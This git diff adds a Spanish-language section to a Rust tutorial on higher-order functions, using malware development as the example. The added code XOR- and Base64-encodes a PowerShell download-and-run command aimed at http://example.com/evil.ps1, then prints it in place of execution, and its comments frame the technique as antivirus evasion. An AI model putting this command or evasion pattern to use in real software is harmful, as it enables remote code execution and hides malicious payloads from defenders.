@@ -237,3 +237,88 @@ let dobles: Vec<_> = numeros.iter().map(|n| n * 2).collect(); // [2, 4, 6]
 ``` 
 
 Acá `.map()` está abstrayendo el bucle y la logica de aplicar una transformación. Nosotros solo nos preocupamos por definir que transformación queremos aplicar a cada elemento.
+
+---
+
+## Ejemplo con malware development
+
+### Payload ofuscado
+
+El objetivo principal de un malware es evitar ser detectado por los antivirus (AV) y analistas. Una técnica fundamental es no incluir el código malicioso (shellcode, comandos, etc.) en texto plano dentro del ejecutable. En su lugar, se almacena de forma ofuscada (cifrada, codificada) y se decodifica en memoria justo antes de usarlo.
+Nuestra función de orden superior nos permitirá cambiar fácilmente el algoritmo de decodificación sin alterar la lógica de ejecución.
+
+En este ejemplo, vamos a simular la ejecución. Ddecodificaremos un comando y lo imprimiremos en la consola. El principio es exactamente el mismo.
+
+```rust
+// Función de orden superior para decodificar y "ejecutar" un payload.
+// F es el tipo genérico para nuestra función de decodificación.
+// El trait `Fn(&[u8]) -> Vec<u8>` significa que F debe ser una función
+// o closure que toma un slice de bytes y devuelve un nuevo Vector de bytes.
+fn execute_decoded_payload<F>(encoded_payload: &[u8], decoder: F)
+where
+    F: Fn(&[u8]) -> Vec<u8>,
+{
+    println!("⚙️ Ejecutor genérico iniciado...");
+
+    // 1. La función 'decoder' que pasamos se invoca aquí.
+    //    No sabemos ni nos importa si es XOR, Base64, etc. Solo la llamamos.
+    let decoded_payload = decoder(encoded_payload);
+    println!("📦 Payload decodificado correctamente.");
+
+    // 2. SIMULACIÓN DE EJECUCIÓN
+    //    En un malware real, aquí es donde el shellcode decodificado
+    //    se copiaría a una memoria ejecutable y se llamaría.
+    //    Nosotros solo lo convertiremos a String para verlo.
+    match String::from_utf8(decoded_payload) {
+        Ok(command) => println!("🚀 EJECUTANDO COMANDO SIMULADO: '{}'", command),
+        Err(_) => println!("❌ Error: El payload decodificado no es un string UTF-8 válido."),
+    }
+    println!("------------------------------------");
+}
+
+// --- Implementaciones de Algoritmos de Decodificación ---
+
+// Algoritmo 1: Decodificador XOR simple
+fn xor_decode(data: &[u8], key: u8) -> Vec<u8> {
+    data.iter().map(|byte| byte ^ key).collect()
+}
+
+// Algoritmo 2: Decodificador Base64 (usando una librería externa)
+// Para usar esto, añade `base64 = "0.21"` a tu Cargo.toml
+fn base64_decode(data: &[u8]) -> Vec<u8> {
+    use base64::{engine::general_purpose, Engine as _};
+    general_purpose::STANDARD.decode(data).unwrap_or_default()
+}
+
+
+fn main() {
+    // Nuestro comando malicioso secreto
+    let secret_command = "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/evil.ps1')\"";
+
+    // --- Preparando Payloads Ofuscados ---
+
+    // 1. Payload ofuscado con XOR y una clave secreta (0xAB)
+    let xor_key = 0xAB;
+    let xor_encoded_payload: Vec<u8> = secret_command.bytes().map(|b| b ^ xor_key).collect();
+    println!("🔑 Payload cifrado con XOR: {:?}", &xor_encoded_payload[..20]);
+
+
+    // 2. Payload ofuscado con Base64
+    use base64::{engine::general_purpose, Engine as _};
+    let base64_encoded_payload = general_purpose::STANDARD.encode(secret_command);
+    println!("📜 Payload codificado en Base64: {}...", &base64_encoded_payload[..20]);
+
+    println!("\n=== INICIANDO OPERACIONES ===\n");
+
+
+    // --- Usando nuestro ejecutor polimórfico ---
+
+    // Ejecutamos el payload XOR. Usamos una closure para capturar la `xor_key`.
+    // La closure `|payload| xor_decode(payload, xor_key)` cumple con el trait `Fn(&[u8]) -> Vec<u8>`.
+    execute_decoded_payload(&xor_encoded_payload, |payload| xor_decode(payload, xor_key));
+
+    // Ejecutamos el payload Base64. Pasamos la función directamente.
+    execute_decoded_payload(base64_encoded_payload.as_bytes(), base64_decode);
+}
+
+``` 
